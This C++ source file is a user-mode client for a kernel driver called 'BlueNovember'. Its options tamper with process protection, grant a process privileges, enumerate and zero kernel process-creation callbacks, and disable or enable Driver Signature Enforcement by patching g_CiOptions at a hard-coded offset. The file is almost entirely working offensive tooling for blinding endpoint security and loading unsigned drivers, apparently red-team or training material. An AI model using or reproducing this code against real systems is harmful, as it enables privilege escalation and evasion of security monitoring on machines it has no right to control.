#include <Windows.h>
#include <stdio.h>

#include "Winternal.h"

#include "..\BlueNovember\IOCTLs.h"
#include "..\BlueNovember\Common.h"

ULONG64 GetCiOptionsAddress();
PVOID GetModuleBase(LPCSTR moduleName);

int main(int argc, const char* argv[])
{
    // check arg length
    if (argc < 2)
    {
        printf("Usage:  Client.exe <option>\n");
        return 1;
    }

    // open handle
    printf("[+] Opening handle to driver...");
    HANDLE hDriver = CreateFile(
        L"\\\\.\\BlueNovember",
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr);

    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("failed! (%d)\n", GetLastError());
        return 1;
    }
    else
    {
        printf("success!\n");
    }

    if (strcmp(argv[1], "-pp") == 0)
    {
        // protect process
        printf("[+] Calling BLUE_NOVEMBER_DEVICE_PROTECT_PROCESS...");

        TargetCallback target;
        target.Index = atoi(argv[2]);

        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_PROTECT_PROCESS,
            &target,
            sizeof(target),
            nullptr,
            0,
            nullptr,
            nullptr);

        if (success)
        {
            printf("success!\n");
        }
        else
        {
            printf("failed\n");
        }
    }
    else if (strcmp(argv[1], "-up") == 0)
    {
        // unprotect process
        printf("[+] Calling BLUE_NOVEMBER_DEVICE_UNPROTECT_PROCESS...");

        TargetCallback target;
        target.Index = atoi(argv[2]);

        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_UNPROTECT_PROCESS,
            &target,
            sizeof(target),
            nullptr,
            0,
            nullptr,
            nullptr);

        if (success)
        {
            printf("success!\n");
        }
        else
        {
            printf("failed\n");
        }
    }
    else if (strcmp(argv[1], "-t") == 0)
    {
        // enable privs
        TargetCallback target;
        target.Index = atoi(argv[2]);

        printf("[+] Calling BLUE_NOVEMBER_PROCESS_PRIVILEGE...");

        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_PROCESS_PRIVILEGE,
            &target,
            sizeof(target),
            nullptr,
            0,
            nullptr,
            nullptr);

        if (success)
        {
            printf("success!\n");
        }
        else
        {
            printf("failed\n");
        }
    }
    else if (strcmp(argv[1], "-l") == 0)
    {
        // list callbacks
        CALLBACK_INFORMATION callbacks[64];
        RtlZeroMemory(callbacks, sizeof(callbacks));

        printf("[+] Calling BLUE_NOVEMBER_ENUM_PROCESS_CALLBACK...");

        DWORD bytesReturned;
        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_ENUM_PROCESS_CALLBACKS,
            nullptr,
            0,
            &callbacks,
            sizeof(callbacks),
            &bytesReturned,
            nullptr);

        if (success)
        {
            printf("success!\n\n");

            LONG numberOfCallbacks = bytesReturned / sizeof(CALLBACK_INFORMATION);

            for (LONG i = 0; i < numberOfCallbacks; i++)
            {
                if (callbacks[i].Pointer > 0)
                {
                    printf("[%d] 0x%llX (%s)\n", i, callbacks[i].Pointer, callbacks[i].ModuleName);
                }
            }
        }
        else
        {
            printf("failed\n");
        }
    }
    else if (strcmp(argv[1], "-r") == 0)
    {
        // remove callback
        TargetCallback target;
        target.Index = atoi(argv[2]);

        printf("[+] Calling BLUE_NOVEMBER_ZERO_PROCESS_CALLBACK...");

        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_ZERO_PROCESS_CALLBACK,
            &target,
            sizeof(target),
            nullptr,
            0,
            nullptr,
            nullptr);

        if (success)
        {
            printf("success!\n");
        }
        else
        {
            printf("failed\n");
        }
    }
    else if (strcmp(argv[1], "-ci") == 0)
    {
        // enum dse
        DSE dse;
        dse.Address = GetCiOptionsAddress();

        printf("[+] Calling BLUE_NOVEMBER_ENUM_DSE...");

        auto buf = malloc(sizeof(ULONG));
        RtlZeroMemory(buf, sizeof(buf));

        DWORD bytesReturned;
        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_ENUM_DSE,
            &dse,
            sizeof(dse),
            &buf,
            sizeof(buf),
            &bytesReturned,
            nullptr);

        if (success)
        {
            printf("success!\n\n");
            printf("DSE Setting: 0x%04X\n", buf);
        }
        else
        {
            printf("failed\n");
        }

        free(buf);
    }
    else if (strcmp(argv[1], "-ciE") == 0)
    {
        // enable dse
        DSE dse;
        dse.Address = GetCiOptionsAddress();

        printf("[+] Calling BLUE_NOVEMBER_ENABLE_DSE...");

        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_ENABLE_DSE,
            &dse,
            sizeof(dse),
            nullptr,
            0,
            nullptr,
            nullptr);

        if (success)
        {
            printf("success!\n\n");
        }
        else
        {
            printf("failed\n");
        }
    }
    else if (strcmp(argv[1], "-ciD") == 0)
    {
        // disable dse
        DSE dse;
        dse.Address = GetCiOptionsAddress();

        printf("[+] Calling BLUE_NOVEMBER_DISABLE_DSE...");

        BOOL success = DeviceIoControl(
            hDriver,
            BLUE_NOVEMBER_DISABLE_DSE,
            &dse,
            sizeof(dse),
            nullptr,
            0,
            nullptr,
            nullptr);

        if (success)
        {
            printf("success!\n\n");
        }
        else
        {
            printf("failed\n");
        }
    }
    else
    {
        printf("[!] Unknown option\n");
    }

    CloseHandle(hDriver);
}

ULONG64 GetCiOptionsAddress()
{
    PVOID kModuleBase = GetModuleBase("CI.dll");

    HMODULE uCi = LoadLibraryEx(L"ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    printf("[+] Userland CI.dll @ 0x%llp\n", uCi);

    FARPROC uCiInit = GetProcAddress(uCi, "CiInitialize");
    printf("[+] Userland CI!CiInitialize @ 0x%llp\n", uCiInit);

    ULONG64 ciInitOffset = (ULONG64)uCiInit - (ULONG64)uCi;
    printf("[+] CI!CiInitialize offset is 0x%llX\n", ciInitOffset);

    ULONG64 kCiInit = ((ULONG64)uCiInit - (ULONG64)uCi) + (ULONG64)kModuleBase;
    printf("[+] Kernel CI!CiInitialize @ 0x%llX\n", kCiInit);

    ULONG64 ciOptions = kCiInit - (ULONG64)0x9418;
    printf("[+] g_CiOptions @ 0x%llX\n", ciOptions);

    return ciOptions;
}

PVOID GetModuleBase(LPCSTR moduleName)
{
    // find NtQuerySystemInformation
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    _NtQuerySystemInformation ntQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    // get required buffer size
    ULONG length;
    NTSTATUS status = ntQuerySystemInformation(
        SystemModuleInformation,
        NULL,
        0,
        &length);

    // allocate memory
    PSYSTEM_MODULE_INFORMATION moduleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(length);
    RtlZeroMemory(moduleInfo, length);

    // get module information
    status = ntQuerySystemInformation(
        SystemModuleInformation,
        moduleInfo,
        length,
        &length);

    // iterate over each module
    PVOID pModule = nullptr;
    for (LONG i = 0; i < moduleInfo->ModulesCount; i++)
    {
        if (strstr(moduleInfo->Modules[i].ImageName, moduleName) != NULL)
        {
            printf("[+] %s found @ 0x%llX\n", moduleInfo->Modules[i].ImageName, moduleInfo->Modules[i].Base);
            pModule = moduleInfo->Modules[i].Base;
            break;
        }
    }

    // free memory
    free(moduleInfo);

    return pModule;
}